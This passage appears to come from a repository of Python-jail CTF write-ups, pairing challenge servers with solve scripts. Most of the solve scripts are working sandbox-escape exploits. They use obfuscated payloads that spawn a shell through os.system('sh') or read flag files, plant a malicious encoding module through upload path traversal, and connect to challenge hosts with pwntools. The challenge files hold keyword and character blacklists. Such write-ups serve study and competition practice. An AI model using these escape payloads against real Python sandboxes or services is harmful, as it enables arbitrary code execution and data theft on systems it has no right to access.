f = lambda: None
with cus():
    obj.lol
print(ss)
ex = ss[0]

try:
    "{0.\\137\\137globals\\137\\137[\\137\\137builtins\\137\\137][\\137\\137import\\137\\137].lol}".format(f)
except ex as e:
    try:
        "{0.popen.lol}".format(e.obj("os"))
    except ex as e:
        print(e.obj("cat /flag*").read())
#EOF
```

### UofTCTF 2024: Zero

- `chal.py`

```py
def check(code):
    # no letters
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    # no numbers
    numbers = "0123456789"
    # no underscores
    underscore = "__"

    return not any((c in alphabet) or (c in numbers) or (underscore in code) for c in code)

def safe_eval(code):
    if (check(code)):
        g = {'__builtins__': None}
        l = {'__builtins__': None}
        return print(eval(code, g, l )) # good luck!
    else:
        print("lol no")

code = input(">>> ")
safe_eval(code)
```

- `solve.py`

```py
[*()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_)[[]>[]].𝘳𝘦𝘨𝘪𝘴𝘵𝘦𝘳._＿𝘣𝘶𝘪𝘭𝘵𝘪𝘯𝘴＿_.𝘷𝘢𝘭𝘶𝘦𝘴()][([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])](""._＿𝘥𝘰𝘤＿_[([]==[])+([]==[])+([]==[])+([]==[])]+""._＿𝘥𝘰𝘤＿_[[]>[]]).𝘴𝘺𝘴𝘵𝘦𝘮(""._＿𝘥𝘰𝘤＿_[[]>[]]+""._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘥𝘰𝘤＿_[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])])

# https://github.com/UofTCTF/uoftctf-2024-chals-public/blob/master/Jail/zero/solve/writeup.md
().＿𝘤𝘭𝘢𝘴𝘴＿.＿𝘣𝘢𝘴𝘦𝘴＿[(''=='')-(''=='')].＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿()[((''=='')+(''=='')+(''=='')+(''=='')+(''==''))((''=='')+(''=='')+(''==''))-((''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''=='')+(''==''))].𝘨𝘦𝘵_𝘥𝘢𝘵𝘢(".",().＿𝘥𝘰𝘤＿[((''=='')+(''==''))((''=='')+(''=='')+(''=='')+(''=='')+(''==''))-(''=='')] + ().＿𝘥𝘰𝘤＿[(''=='')+(''=='')+(''=='')] + [].＿𝘥𝘰𝘤＿[((''=='')+(''=='')+(''=='')+(''==''))*((''=='')+(''=='')+(''==''))] + [].＿𝘥𝘰𝘤＿[(((''=='')+(''=='')+(''=='')+(''==''))<<((''=='')+(''=='')+(''=='')))+((''=='')+(''=='')+(''=='')+(''==''))])
```

### GlacierCTF 2023: Avatar

- `server.py`

```py
print("You get one chance to awaken from the ice prison.")
code = input("input: ").strip()
whitelist = """gctf{"*+*(=>:/)*+*"}""" # not the flag
if any([x not in whitelist for x in code]) or len(code) > 40000:

    print("Denied!")
    exit(0)

eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})
```

- `solve.py`

```py
m = b"""[a for a in ().__class__.__base__.__subclasses__() if 'wrapper' not in f'{a.__init__}'][0].__init__.__builtins__['__import__']('os').system('sh')"""
print(m)
m = [int(x) for x in m]
m = m[3:]

mapping = {
    1: "g",
    2: "t",
    32: "f",
    91: "c",
    ord('a'): "c+t+t+t",
    ord('f'): "c+t+t+t+t+t+g",
    ord('o'): "c+t+t+t+t+t+t+t+t+t+t",
    ord('r'): "c+t+t+t+t+t+t+t+t+t+t+t+g",
    ord('i'): "c+t+t+t+t+t+t+t",
    ord('n'): "c+t+t+t+t+t+t+t+t+t+g",
    ord('('): "f+t*t*t",
    ord(')'): "f+t*t*t+g",
    ord('.'): "f+t*t*t+t+t+t",
    ord('_'): "c+t+g+g",
    ord('c'): "c+t+t+t+t",
    ord('l'): "c+t+t+t+t+t+t+t+t+g",
    ord('s'): "c+t*t*t*t+t+t+t+t",
    ord('b'): "c+t+t+t+g",
    ord('e'): "c+t+t+t+t+t",
    ord('u'): "c+t*t*t*t+t+t+t+t+t",
    ord("'"): "f+t+t+t+g",
    ord('w'): "c+t*t*t*t+t+t+t+t+t+t",
    ord('p'): "c+t+t+t+t+t+t+t+t+t+t+g",
    ord('t'): "c+t*t*t*t+t+t+t+t+g",
    ord('['): "c",
    ord(']'): "c+t",
    ord('0'): "f+t+t+t+t+t+t+t+t",
    ord('m'): "c+t+t+t+t+t+t+t+t+t",
    ord('y'): "c+t*t*t*t+t+t+t+t+t+t+t",
    ord('h'): "c+t+t+t+t+t+t+g",
}

payload = 'f"{(f:=(t:=(g:=+(()==()))+g)*t*t*t*t+g+g)+t*t*(t+g):c}{(c:=(f*t+t*t*t*t+t*t*t+t+g)):c}{c:c}{c+t+t:c}'
payload = 'f"{(c:=(f:=(t:=(g:=+(()==()))+g)*t*t*t*t)*t+t*t*t*t+t*t*t+t+g):c}{c+t+t+t:c}{f:c}'

whitelist = """gctf{"*+*(=>:/)*+*"}"""
# generate payload
for c in m:
    if chr(c) in whitelist:
        if chr(c) == "{" or chr(c) == "}":
            payload += chr(c)*2
        else:
            payload += chr(c)
    elif c not in mapping:
        payload += "{c:c}"
    else:
        payload += "{%s:c}" % mapping[c]
payload += '"'
print(len(payload))
print(payload)
print(eval(payload)) # verify payload is the same
```

### TFC CTF 2023: My Third Calculator

- `server.py`

```py
import sys
print("This is a safe calculator")
inp = input("Formula: ")
sys.stdin.close()

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."
if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "__builtins__": {"setattr": setattr, "__import__": __import__, "chr": chr}
}
print(eval(inp, fns, fns))
```

- `solve.py`

```py
# [setattr(__import__('os'), 'environ', {'BROWSER': '/bin/sh -c "cat /flag" #%s'}), __import__('antigravity')]
[𝘴𝘦𝘵𝘢𝘵𝘵𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__('\\157\\163'), '\\145\\156\\166\\151\\162\\157\\156', {'\\102\\122\\117\\127\\123\\105\\122':'\\57\\142\\151\\156\\57\\163\\150\\40\\55\\143\\40\\42\\143\\141\\164\\40\\57\\146\\154\\141\\147\\42\\40\\43\\45\\163'}), __𝘪𝘮𝘱𝘰𝘳𝘵__('\\141\\156\\164\\151\\147\\162\\141\\166\\151\\164\\171')]
```

### Equinor CTF 2023: Dis is it!

- `main.py`

```py
from flask import Flask, request, redirect, send_from_directory
import dis
import io
import contextlib
import os
import datetime
app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/report/<path:filename>')
def serve_reports(filename):
    res = send_from_directory('./reports/', filename)
    del res.headers['Content-Disposition']
    res.headers['Content-Type'] = 'text/plain'
    return res

@app.route('/api/disassemble', methods=['POST'])
def disassemble():
    report_name = request.files['source'].filename
    source = request.files['source'].stream.read()
    if os.path.exists('./reports/' + report_name):
        return redirect('/report/' + report_name)
    report = io.StringIO()
    with contextlib.redirect_stdout(report):
        print('-')
        print('Report for', report_name)
        print('Report date:', datetime.datetime.now())
        print('-')
        try:
            code = compile(source, '<string>', 'exec')
            dis.dis(code)
        except SyntaxError as e:
            print('Error:', e)
        print('-')
        print('Source code:')
        print('-')
    with open('./reports/' + report_name, 'w') as file:
        width = max(60, max(len(line) for line in report.getvalue().split('\n')))
        for line in report.getvalue().strip().split('\n'):
            line = line.ljust(width) if line != '-' else '-' * width
            file.write('# ' + line + ' #\n')
        file.write(source.decode())
    return redirect('/report/' + report_name)

if __name__ == '__main__':
    app.run('0.0.0.0', 1337)
```

- `solve.py`

```py
# @null
import requests
# target = 'http://localhost:1337/'
target = 'http://io.ept.gg:42256/'

payload = b'''import os
os.system('cp /flag*.txt /app/reports/flag.txt')'''

# Upload payload to /usr/local/lib/python3.12/encodings/fefe.py
files = {'source': ('../../usr/local/lib/python3.12/encodings/fefe.py', payload.decode())}
requests.post(target + '/api/disassemble', files=files, allow_redirects=False)

# When running or compiling python files that use the fefe encoding will now trigger our payload
files = {'source': ('fefe.py', b'# encoding: fefe')}
requests.post(target + '/api/disassemble', files=files, allow_redirects=False) # trigger payload
# Read flag
print(requests.get(target + '/report/flag.txt').text)
```

### 37C3 Potluck CTF: tacocat

- `main.py`

```py
while True:#
    x = input("palindrome? ")#
    assert "#" not in x, "comments are bad"#
    assert all(ord(i) < 128 for i in x), "ascii only kthx"#
    print(x, x[::-1])
    assert x == x[::-1], "not a palindrome"#
    assert len(x) < 36, "palindromes can't be more than 35 characters long, this is a well known fact."#
    #assert sum(x.encode()) % 256 == 69, "not nice!"#
    eval(x)#)x(lave
#"!ecin ton" ,96 == 652 % ))(edocne.x(mus tressa
#".tcaf nwonk llew a si siht ,gnol sretcarahc 53 naht erom eb t'nac semordnilap" ,63 < )x(nel tressa
#"emordnilap a ton" ,]1-::[x == x tressa
#"xhtk ylno iicsa" ,)x ni i rof 821 < )i(dro(lla tressa
#"dab era stnemmoc" ,x ni ton "#" tressa
#)" ?emordnilap"(tupni = x
#:eurT elihw
```

- `solve.py`

```py
# setting up template for generating palindromes
alph = "abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\\"#¤%&/()=?@$€{[]}"
dd = r"""'START\\',)"CHAR"=:VAR1(,',(VAR1:="CHAR"),'\\START'"""
ff = r"""'START\\',)"CHAR"+VAR2=:VAR1(,',(VAR1:=VAR2+"CHAR"),'\\START'"""
gg = r"""'START\\',))VAR1(lave(,',(eval(VAR1)),'\\START'"""
ch = [dd,ff,gg]

payload = """eval(input());"""
out = []

var = var2 = "C"
for i,char in enumerate(payload):
    found = False
    # some dumb manual fixes
    if i == 7:
        var = "a"
        var2 = "C"
    if i == 8:
        var = "C"
        var2 = "a"
    if i == 9:
        var = "b"
        var2 = "C"
    if i == 10:
        var = "b"
        var2 = "b"
    # brute char
    for brute in alph:
        n = ch[1 if i>0 and i!=len(payload)-1 else 0 if i == 0 else 2].replace("START",brute)
        if char == "\\"":
            char = "\\\\"+char
        n = n.replace("CHAR",char)
        n = n.replace("VAR1", var)
        n = n.replace("VAR2", var2)
        check = sum(n.encode()) % 256
        if check == 69 and n == n[::1]:
            out.append(n)
            print(out)
            found = True
            break
    if not found:
        print("COULDNT FIND VALID CHAR", i, payload[i])
        break

# verify payload works
print()
for p in out[:-1]:
    print(p)
    eval(p)
payload = eval(var)
print(f"{payload=}")
"""
'Y\\',)"e"=:C(,',(C:="e"),'\\Y'
'Z\\',)"v"+C=:C(,',(C:=C+"v"),'\\Z'
'o\\',)"a"+C=:C(,',(C:=C+"a"),'\\o'
'd\\',)"l"+C=:C(,',(C:=C+"l"),'\\d'
'(\\',)"("+C=:C(,',(C:=C+"("),'\\('
'g\\',)"i"+C=:C(,',(C:=C+"i"),'\\g'
'b\\',)"n"+C=:C(,',(C:=C+"n"),'\\b'
'B\\',)"p"+C=:a(,',(a:=C+"p"),'\\B'
'=\\',)"u"+a=:C(,',(C:=a+"u"),'\\='
'=\\',)"t"+C=:b(,',(b:=C+"t"),'\\='
'j\\',)"("+b=:b(,',(b:=b+"("),'\\j'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'a\\',))b(lave(,',(eval(b)),'\\a'
"""

from pwn import *
sh = remote('challenge28.play.potluckctf.com',31337)
for p in out:
    sh.sendlineafter('palindrome?', p.encode())
sh.sendline("__import__('os').system('sh')")
sh.interactive()
```

### Internet Festival 2023 CTF Finals: prison

- `prison.py`

```py
#!/usr/bin/env python3

def main():
        locals = {'__builtins__': {'__build_class__': __build_class__, "print": print}}

        blacklist = [
                '\'', '""', '((', '[[', '{', '==',
                '0', '11', '2', '3', '4', '5', '6', '7', '8', '9',
                'True', 'False', 'None', '...',
                '+', '-', '**', '/', '%', '<', '>', '&', '|', '^', '~',
        ]

        code = input()
        if not code.isascii() or any(word in code for word in blacklist):
                print("Blacklisted word detected, exiting ...")
                exit(1)

        exec(code, locals)

if __name__ == '__main__':
        main()
```

- `solve.py`

```py
from pwn import *
io = remote("challs.ifctf.fibonhack.it", 10010)
payload = """
for __name__ in __build_class__.__class__.__dir__.__qualname__:
    @__build_class__.__self__.exec
    @__build_class__.__self__.input
    class x:pass
"""
payload = payload.replace("\n","\r")
io.sendline(payload)
io.sendline("__build_class__.__self__.print(__build_class__.__self__.open('./flag.txt').read())")
io.interactive()
```

### WACON 2023 Prequal: ScavengerHunt

- `prob.py`

```py
#!/usr/bin/env python3
import secret
import pyseccomp
import sys

print("Find the treasure!")
data = input()

f = pyseccomp.SyscallFilter(defaction=pyseccomp.KILL)
f.add_rule(pyseccomp.ALLOW, 'rt_sigaction')
f.add_rule(pyseccomp.ALLOW, 'munmap')
f.add_rule(pyseccomp.ALLOW, 'exit_group')
f.add_rule(pyseccomp.ALLOW, 'exit')
f.add_rule(pyseccomp.ALLOW, 'brk')
f.load()
del pyseccomp
del f
del sys

__builtins__ = {}
try:
    eval(data, {'__builtins__': {}}, {'__builtins__': {}})
except:
    pass
exit(0)
```

- `secret.py`

```py
__builtins__ = {}

some_unknown_and_very_long_identifier_name = "WACON2023{[REDACTED]}"
```

- `solve.py`

```py
from pwn import *
import time
context.log_level = "critical"

# Find the offset for os._wrap_close on server (140)
alph = b"{}0123456789abcdef"
flag = "WACON2023{"
# flag = "WACON2023{91d9cec468a8b22b57c2b091beb64bcc}"
index = len(flag)
while "}" not in flag:
    for guess in alph:
        # sh = remote("1.234.10.246", 55555)
        sh = process(["python3", "og.py"])
        payload = f'''[a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,b:=a["__import__"],c:=b("secret").__dir__()[-1],d:=b("secret").__getattribute__(c),a["exec"]("while True:\\n\\tpass") if (a["ord"](d[{index}]))=={guess} else 1]'''
        print(payload)
        sh.recv()
        sh.sendline(payload)
        start = time.time()
        try:
            sh.recv(timeout=1)
        except:
            end = time.time()
            if int(end-start) >= 1:
                index += 1
                flag += chr(guess)
                print(end-start, flag)
                sh.close()
                break
            sh.close()
            continue
        end = time.time()
        if int(end-start) >= 1:
            index += 1
            flag += chr(guess)
            print(end-start, flag)
            sh.close()
            break
print(flag)
# [a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,a["exec"]("while True:\n\tpass") if True else 1]
```

### CrewCTF 2023: starship-1

- `sandbox.py`

```py
#!/usr/bin/env python3
import re
import sys

class Nobuffers:
    def __init__(self, stream):
        self.stream = stream

    def write(self, data):
        self.stream.write(data)
        self.stream.flush()

    def writelines(self, datas):
        self.stream.writelines([f"{data}\n" for data in datas])
        self.stream.flush()

    def __getattr__(self, attr):
        return getattr(self.stream, attr)

banned = re.escape('\\(~}?>{&/%`)<$|*=#!-+\'0123456789;[] ')
stdout = Nobuffers(sys.stdout)
stdout.write('''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/\|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"`"""`----------.........___
__============:' "" |==|__\===========(=>=+    |           ,_, .-"`--..._
  ;="|"|  |"| `.____|__|__/===========(=>=+----+===-|---------<---------_=-
 | ==|:|\/| |   | o|.-'__,-|   .'  _______|o  `----'|        __\ __,.-'"
  "`--""`--"'"""`.-+------'" .'  _L___,,...-----------"""""""   "
                  `------""""""""

''')

stdout.write('Enter command: ')
prompt = input()

if prompt.isascii() and not re.findall(f'[{banned}]', prompt):
    try:
        exec(prompt, {'__builtins__': {'__build_class__': __build_class__, "__name__":__name__}})
    except:
        pass
```

- `solve.py`

```py
# @quasar - eval("__import__('os').system('sh')")
a = """@__build_class__.__self__.eval
@__build_class__.__self__.bytes
@__build_class__.__self__.copyright._Printer__filenames.__add__
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"sh".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@".system".format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"os".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"__build_class__.__self__.__import__".format
class\x0ca:...""".replace("\n", "\r")

# @st4rn
from pwn import *
p = remote("starship-1.chal.crewc.tf", 40003)
p.sendline('@__build_class__.__self__.exec\r@__build_class__.__self__.input\rclass\x0cx:pass')
p.sendline('__build_class__.__self__.__import__("os").system("sh")')
p.interactive()
```

### CrewCTF 2023: starship

- `server.py`

`````py
#!/usr/bin/env python
import re
import sys


class Nobuffers:
    def __init__(self, stream, limit=1024):
        self.stream = stream
        self.limit = limit

    def write(self, data):
        if len(data) > self.limit:
            raise ValueError(f"Data exceeds the maximum limit of {self.limit} characters")
        self.stream.write(data)
        self.stream.flush()

    def writelines(self, datas):
        datas = [f"{data}\n" for data in datas if len(data) <= self.limit]
        self.stream.writelines(datas)
        self.stream.flush()

    def __getattr__(self, attr):
        return getattr(self.stream, attr)


blacklisted_chars = re.escape('\\(~}?>{)&/%`<$|*=#!-@+"\'0123456789;')
blacklisted_words = [
    'unicode', 'name', 'setattr', 'import', 'open', 'enum',
    'char', 'quit', 'getattr', 'locals', 'globals', 'len',
    'exit', 'exec', 'blacklisted_words', 'print', 'builtins',
    'eval', 'blacklisted_chars', 'repr', 'main', 'subclasses', 'file',
    'class', 'mro', 'input', 'compile', 'init', 'doc', 'fork',
    'popen', 'read', 'map', 'dir', 'help', 'error', 'warning',
    'func_globals', 'vars', 'filter', 'debug', 'object', 'next',
    'word', 'base', 'prompt', 'breakpoint', 'class', 'pass',
    'chr', 'ord', 'iter', 'banned'
]
blacklisted_unicode = [
    '\u202e', '\u2060', '\u200f', '\u202a', '\u202b', '\u202c'
    '\u202d', '\u202f', '\u2061', '\u2062', '\u2063', '\u2064', '\ufeff'
]

blacklisted_chars = f'[{blacklisted_chars}]'
blacklisted_words = '|'.join(f'({word})' for word in blacklisted_words)
blacklisted_unicode_pattern = '|'.join(blacklisted_unicode)
blacklisted_nonascii = '[^\x00-\x7F]'

stdout = Nobuffers(sys.stdout)
stdout.write('''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/\|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"````"""`----------.........___
__============:' "" |==|__\===========(=>=+    |           ,_, .-"`--..._
  ;="|"|  |"| `.____|__|__/===========(=>=+----+===-|---------<---------_=-
 | ==|:|\/| |   | o|.-'__,-|   .'  _______|o  `----'|        __\ __,.-'"
  "`--""`--"'"""`.-+------'" .'  _L___,,...-----------"""""""   "
                  `------""""""""

''')

stdout.write('Enter command: ')
prompt = input()

prompt = prompt.encode('unicode-escape').decode('ascii')
prompt = bytes(prompt, 'ascii').decode('unicode-escape')

if re.findall(blacklisted_chars, prompt):
    raise Exception('Blacklisted character detected. Go away!')

if re.findall(blacklisted_words, prompt, re.I):
    raise Exception('Blacklisted word detected. Go away!')

if re.search(blacklisted_unicode_pattern, prompt):
    raise Exception('Blacklisted unicode detected. Go away!')

if re.search(blacklisted_nonascii, prompt):
    raise Exception('Non-ASCII character detected. Go away!')

try:
    exec(prompt)
except:
    pass
`````

- `solve.py`

```py
# @quasar - setting sys.stdout.flush to breakpoint
[id for sys.stdout.flush in [id.__self__.__dict__[mA] for aA,bA,cA,dA,eA,fA,gA,hA,iA,jA,kA,lA,mA,nA,oA,pA,qA,rA,sA,tA,uA,vA,wA,xA,yA,zA,aB,bB,cB,dB,eB,fB,gB,hB,iB,jB,kB,lB,mB,nB,oB,pB,qB,rB,sB,tB,uB,vB,wB,xB,yB,zB,aC,bC,cC,dC,eC,fC,gC,hC,iC,jC,kC,lC,mC,nC,oC,pC,qC,rC,sC,tC,uC,vC,wC,xC,yC,zC,aD,bD,cD,dD,eD,fD,gD,hD,iD,jD,kD,lD,mD,nD,oD,pD,qD,rD,sD,tD,uD,vD,wD,xD,yD,zD,aE,bE,cE,dE,eE,fE,gE,hE,iE,jE,kE,lE,mE,nE,oE,pE,qE,rE,sE,tE,uE,vE,wE,xE,yE,zE,aF,bF,cF,dF,eF,fF,gF,hF,iF,jF,kF,lF,mF,nF,oF,pF,qF,rF,sF,tF,uF,vF,wF,xF,yF,zF,aG in [id.__self__.__dict__]]]

# @st4rn - os.system("sh")
[[re.A[i] for re.RegexFlag.__getitem__ in [[[re.A[i] for re.RegexFlag.__getitem__ in [sys.modules.get]] for i in [[[re.A[i] for re.RegexFlag.__getitem__ in [str]] for i in [re.A[[i for i in [re.X.value^re.U.value^re.M.value^re.L.value^re.I.value^re.T.value, re.X.value^re.U.value^re.S.value^re.I.value^re.T.value]]] for re.RegexFlag.__getitem__ in [bytearray]]][re.A.value^re.A.value][re.A.value^re.A.value][re.M.value^re.L.value:re.I.value^re.L.value^re.M.value]]][re.A.value^re.A.value][re.A.value^re.A.value].system]] for i in [[[re.A[i] for re.RegexFlag.__getitem__ in [str]] for i in [re.A[[i for i in [re.X.value^re.U.value^re.S.value^re.I.value^re.T.value, re.X.value^re.U.value^re.M.value]]] for re.RegexFlag.__getitem__ in [bytearray]]][re.A.value^re.A.value][re.A.value^re.A.value][re.M.value^re.L.value:re.I.value^re.L.value^re.M.value]]]

# @Satoooon
from pwn import *

payload = ""
# get builtins
payload += "for b in [sys.modules[[k for k in sys.modules][True]]]:None\r"
# get input()
payload += "for ks in [[k for k in b.__dict__]]:None\r"
payload += "for ks in [ks[True:]]:None\r" * 28
payload += "for inp in [b.__dict__[ks[False]]]:None\r"
# create "exec"
payload += "for Nobuffers.__getitem__ in [inp]:None\r"
payload += "for s in [stdout[None]]:None\r"
# get exec()
payload += "for exc in [b.__dict__[s]]:None\r"
# exec(input())
payload += "for v in [stdout[None]]:None\r"
payload += "for Nobuffers.__getitem__ in [exc]:None\r"
payload += "stdout[v]"

# io = process(["python3","./chall.py"])
io = remote("starship.chal.crewc.tf", 40002)
io.sendline(payload)
io.sendline("exec")
io.sendline("import os; os.system('sh')")

io.interactive()
```

### CrewCTF 2023: setjail

- `main.py`

```py
import re
import ast

import void # void module contains an ascii art string

"""
Example:

( when root object is A )
path: .B.C["D"][1][2][3]
value: "pyjail is fun!"

->

A.B.C["D"][1][2][3] = "pyjail is fun!"

"""

DISALLOWED_WORDS = ["os", "posix"]
ROOT_OBJECT = void

def abort(s):
	print(s)
	exit(1)

def to_value(s):
	return ast.literal_eval(s)

# gift
module = input("import: ")
__import__(module)

path = input("path: ")
value = to_value(input("value: "))

path, _, last_item_key, last_attr_key = re.match(r"(.*)(\[(.*)\]|\.(.*))", path).groups()

# set root object
current_obj = ROOT_OBJECT

# walk object
while path != "":
	_, item_key, attr_key, path = re.match(r"(\[(.*?)\]|\.([^\.\[]*))(.*)", path).groups()

	if item_key is not None:
		item_key = to_value(item_key)
		if any([word in item_key for word in DISALLOWED_WORDS]):
			abort("deny")
		current_obj = current_obj[item_key]
	elif attr_key is not None:
		if any([word in attr_key for word in DISALLOWED_WORDS]):
			abort("deny")
		current_obj = getattr(current_obj, attr_key)
	else:
		abort("invalid")


# set value
if last_item_key is not None:
	last_item_key = to_value(last_item_key)
	current_obj[last_item_key] = value
elif last_attr_key is not None:
	setattr(current_obj, last_attr_key, value)

print("Done")
```

- `solve.py`

```py
# @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
import: ctypes._aix
path: .__loader__.exec_module.__globals__["sys"].modules["ctypes._aix"].environ["PYTHONINSPECT"]
value: "1"

# @maple3142
import: main
import: os
path: .__builtins__["help"].__repr__.__globals__["sys"].modules["__main__"].DISALLOWED_WORDS
value: []
path: .__builtins__["help"].__repr__.__globals__["sys"].modules["os"].environ["PYTHONINSPECT"]
value: "1"
```

### CrewCTF 2023: jailpie

- `server.py`

```py
#!/usr/local/bin/python3
import base64
import types
import dis

def is_valid(code):
    whitelist = {
        'LOAD_CONST',
        'BINARY_OP',
        'COMPARE_OP',
        'POP_JUMP_BACKWARD_IF_TRUE',
        'RETURN_VALUE',
    }

    for instr in dis.Bytecode(code):
        if instr.opname not in whitelist:
            return False

        if 'JUMP' in instr.opname and not (0 <= instr.argval < len(code.co_code)):
            return False

    return True

if __name__ == '__main__':
    _print, _eval = print, eval
    # try:
    prog = bytes.fromhex(input('Program: '))
    code = types.CodeType(0, 0, 0, 0, 0, 0, prog, (0,), (), (), '', '', '', 0, b'', b'', (), ())
    assert is_valid(code)

    __builtins__.__dict__.clear()
    _print(_eval(code, {}))
    # except:
    #     _print('Nice try!')
```

- `solve.py`

```py
# TBA
```

### SEETF 2023: Another PyJail

- `server.py`

```py
from types import CodeType

def clear(code):
    return CodeType(
        code.co_argcount, code.co_kwonlyargcount, code.co_nlocals,
        code.co_stacksize, code.co_flags, code.co_code,
        # No consts for youuu
        tuple(clear(c) if isinstance(c, CodeType) else None for c in code.co_consts),
        # No names for youuuu
        (),
        code.co_varnames, code.co_filename, code.co_name,
        code.co_firstlineno, code.co_lnotab, code.co_freevars,
        code.co_cellvars
    )

print(eval(clear(compile(input("> "), __name__, "eval")), {'__builtins__': {}}, {})(getattr))
```

- `solve.py`

```py
@ juliapoo
lambda g: (
    (lambda _0, _1:
        (lambda _2, _4, _8, _16, _32, _64, _128:
        (lambda _1234567890:
            (lambda
                s_n,s_r,s_a,s_o,s_t,s_c,s_l,s_larr,s_i,s_g,s_e,s_b,s_dash,s_f,s_ ,s_rarr,s_u,
                s_T,
                s_F,s_s,
                s_lbrack,s_rbrack,
                s_4,s_5,s_9,s_6,s_3,s_8,s_2,s_7,s_0,s_1,
                s_x,s_j,s_N:
                (lambda morestr:
                    (lambda s_d,s_m,s_h:
                        (lambda fromhex, decodestr:
                            (lambda
                                s__class__,
                                s__bases__,
                                s__subclasses__,
                                s_load_module,
                                s_system:
                                (lambda load_module:
                                    (lambda os:
                                        (lambda system: system(s_s + s_h))
                                        (g(os, s_system))
                                    )(load_module(s_o + s_s))
                                )(g(g(g(g(g, s__class__), s__bases__)[_0], s__subclasses__)()[_16+_64], s_load_module))
                            )(
                                g(fromhex(s_5+s_f+s_5+s_f+s_6+s_3+s_6+s_c+s_6+s_1+s_7+s_3+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
                                g(fromhex(s_5+s_f+s_5+s_f+s_6+s_2+s_6+s_1+s_7+s_3+s_6+s_5+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
                                g(fromhex(s_5+s_f+s_5+s_f+s_7+s_3+s_7+s_5+s_6+s_2+s_6+s_3+s_6+s_c+s_6+s_1+s_7+s_3+s_7+s_3+s_6+s_5+s_7+s_3+s_5+s_f+s_5+s_f), decodestr)(),
                                g(fromhex(s_6+s_c+s_6+s_f+s_6+s_1+s_6+s_4+s_5+s_f+s_6+s_d+s_6+s_f+s_6+s_4+s_7+s_5+s_6+s_c+s_6+s_5), decodestr)(),
                                g(fromhex(s_7+s_3+s_7+s_9+s_7+s_3+s_7+s_4+s_6+s_5+s_6+s_d), decodestr)()
                            )
                        )(g(g(s_5+s_f, s_e+s_n+s_c+s_o+s_d+s_e)(), s_f+s_r+s_o+s_m+s_h+s_e+s_x), s_d+s_e+s_c+s_o+s_d+s_e)
                    )(morestr[_1+_2+_4+_8],morestr[_2+_8],morestr[_1+_4+_8])
                )(f"{g({}, s_g+s_e+s_t)}")
            )(
                f'{g}'[_8],f'{g}'[_1+_8+_16],f'{g}'[_2+_4+_16],f'{g}'[_16],f'{g}'[_1+_4],f'{g}'[_1+_4+_8],f'{g}'[_4],f'{g}'[_0],f'{g}'[_1+_2],f'{g}'[_1+_2+_16],f'{g}'[_4+_16],f'{g}'[_1],f'{g}'[_2+_4],f'{g}'[_2+_8],f'{g}'[_1+_8],f'{g}'[_2+_8+_16],f'{g}'[_2],
                f'{g==g}'[_0],
                f'{g!=g}'[_0],f'{g!=g}'[_1+_2],
                f"{({*f'{g}'[_0:_0]})}"[_1+_2],f"{({*f'{g}'[_0:_0]})}"[_4],
